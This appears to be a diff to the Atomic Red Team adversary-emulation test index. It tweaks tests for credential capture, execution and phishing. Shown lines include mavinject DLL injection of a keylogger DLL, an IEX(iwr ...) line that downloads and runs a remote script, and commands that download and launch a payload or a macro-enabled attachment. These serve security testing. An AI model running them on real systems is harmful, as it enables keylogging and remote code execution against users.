@@ -863,11 +863,11 @@ credential-access:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name} -UseBasicParsing
+          Invoke-WebRequest #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1110.004:
@@ -8322,11 +8322,11 @@ collection:
 '
         get_prereq_command: |
           New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}"
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1056.004/bin/T1056.004x64.dll" -OutFile "#{file_name}" -UseBasicParsing
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name} -UseBasicParsing
+          Invoke-WebRequest #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1074:
@@ -62958,6 +62958,9 @@ execution:
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
+        cleanup_command: 'Stop-Process -name mshta
+
+'
     - name: Potentially Unwanted Applications (PUA)
       auto_generated_guid: 02f35d62-9fdc-4a97-b899-a5d9a876d295
       description: 'The Potentially Unwanted Applications (PUA) protection feature
@@ -62987,9 +62990,9 @@ execution:
         command: |
           Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
           & "#{pua_file}"
-        cleanup_command: 'Remove-Item #{pua_file} -ErrorAction Ignore
-
-'
+        cleanup_command: |
+          Stop-Process -name PotentiallyUnwanted
+          Remove-Item #{pua_file} -ErrorAction Ignore
     - name: Office Generic Payload Download
       auto_generated_guid: 5202ee05-c420-4148-bf5e-fd7f7d24850c
       description: |
@@ -73207,29 +73210,23 @@ initial-access:
       - Linux
       identifier: T1566.001
     atomic_tests:
-    - name: Download Phishing Attachment - VBScript
+    - name: Download Macro-Enabled Phishing Attachment
       auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
       description: |
-        The macro-enabled Excel file contains VBScript which opens your default web browser and opens it to [google.com](http://google.com).
-        The below will successfully download the macro-enabled Excel file to the current location.
-        File is downloaded to the %temp% folder.
+        This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
+        The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
       supported_platforms:
       - windows
       executor:
         command: |
-          if (-not(Test-Path HKLM:SOFTWARE\Classes\Excel.Application)){
-            return 'Please install Microsoft Excel before running this test.'
-          }
-          else{
-            $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
-            $fileName = 'PhishingAttachment.xlsm'
-            New-Item -Type File -Force -Path $fileName | out-null
-            $wc = New-Object System.Net.WebClient
-            $wc.Encoding = [System.Text.Encoding]::UTF8
-            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-            Invoke-WebRequest -Uri $url -OutFile $fileName
-          }
+          $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
         name: powershell
+        cleanup_command: 'Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction
+          Ignore
+
+'
     - name: Word spawned a command shell and used an IP address in the command line
       auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
       description: |
